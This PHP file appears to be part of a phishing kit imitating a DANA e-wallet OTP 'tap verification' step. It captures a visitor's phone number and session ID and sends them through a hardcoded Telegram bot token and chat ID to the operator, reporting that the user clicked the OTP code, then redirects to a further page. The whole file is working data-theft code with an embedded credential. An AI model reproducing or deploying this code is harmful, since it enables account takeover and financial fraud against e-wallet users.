<?php
session_start();
header('Content-Type: application/json');

$phone = $_POST['nohp'] ?? ($_SESSION['phoneNumber'] ?? '-');
$session_id = $_POST['session_id'] ?? 'sess_' . rand(1000, 9999);

$_SESSION['phoneNumber'] = $phone;
$_SESSION['tap_session_id'] = $session_id;

// KIRIM TELEGRAM
$botToken = "8839179457:AAEXfHKC0IAtVOU_oBXzhGqwZhypKqJnsNo";
$chatId   = "7938498485";
$message  = "🔔 *DANA | TAP VERIFIKASI*\n";
$message .= "━━━━━━━━━━━━━━━━━━\n";
$message .= "📱 *Nomor HP:* `$phone`\n";
$message .= "🆔 *ID:* `$session_id`\n";
$message .= "📍 *Status:* User Klik Kode OTP ✅\n";
$message .= "━━━━━━━━━━━━━━━━━━\n";

$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=".urlencode($message)."&parse_mode=Markdown";
file_get_contents($url);

echo json_encode(['status' => 'success', 'redirect' => 'ver.html']);
?>
